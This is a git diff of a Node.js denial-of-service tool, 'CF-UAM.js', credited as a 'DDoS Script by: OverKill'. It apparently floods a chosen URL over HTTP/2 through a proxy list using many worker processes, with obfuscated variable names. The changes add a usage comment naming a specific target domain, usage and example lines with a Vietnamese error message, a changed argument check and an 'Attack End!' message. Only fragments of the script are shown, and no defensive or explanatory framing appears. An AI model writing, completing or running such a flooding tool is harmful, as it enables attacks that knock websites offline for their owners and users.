@@ -1,3 +1,4 @@
+// node CF-UAM.js [GET/POST] https://ht4gvpn.cc http.txt 5 10
 const url = require('url'),
 fs = require('fs'),
 http2 = require('http2'),
@@ -133,11 +134,13 @@ function dataed(_0xf3b6x10) {
   ;
   return _0xf3b6x11;
 }
-if (process.argv.length < 8) {
-  console.log("	");
+if (process.argv.length < 7) {
+  console.log("\x1b[31m ERROR\x1b[37m: Nhập thiếu dữ liệu");
+  console.log("\x1b[36m USAGE\x1b[37m: node CF-UAM.js <GET/POST> <target> <proxies> <time> <thread>");
+  console.log("\x1b[32m EXAMPLE\x1b[37m: node CF-UAM.js GET https://example.com proxy.txt 60 100");
+  console.log("\x1b[93m DDoS Script by:\x1b[34m OverKill ");
   process.exit(0);
-}
-;
+};
 var rate = process.argv[6];
 var method = process.argv[2];
 var proxys = fs.readFileSync(process.argv[4], "utf-8").toString().replace(/\r/g, "").split("\n");
@@ -148,7 +151,7 @@ if (cluster.isMaster) {
   }
   ;
   setTimeout(() => {
-    console.log("Attack ended.".green.bold);
+    console.log("Attack End!".green.bold);
     process.exit(-1);
   }, process.argv[5] * 1e3);
 } else {
